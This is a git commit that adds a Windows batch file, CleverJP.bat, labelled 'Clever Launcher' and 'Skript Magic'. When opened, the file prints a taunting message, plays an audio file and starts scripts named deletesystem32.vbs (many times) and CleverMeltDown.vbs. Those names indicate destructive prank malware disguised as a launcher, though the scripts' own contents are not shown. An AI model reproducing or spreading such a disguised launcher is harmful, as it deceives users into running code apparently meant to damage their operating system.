6fa8dc637790c05f385259c918435916828260d8
Massivebutterpapper <106040279+Massivebutterpapper@users.noreply.github.com>
2022-09-02 17:50:49 -0700

    Clever Launcher
    .bat C++ Skript Magic! Open CleverJP.bat

---
+++ CleverJP.bat
@@ -0,0 +1,17 @@
+@echo off
+echo YOUR PC IS TRASH BRO!
+start Uwa_So_Temperate_but_REALLY__distroyed.m4a
+start deletesystem32.vbs
+start deletesystem32.vbs
+start CleverMeltDown.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
+start deletesystem32.vbs
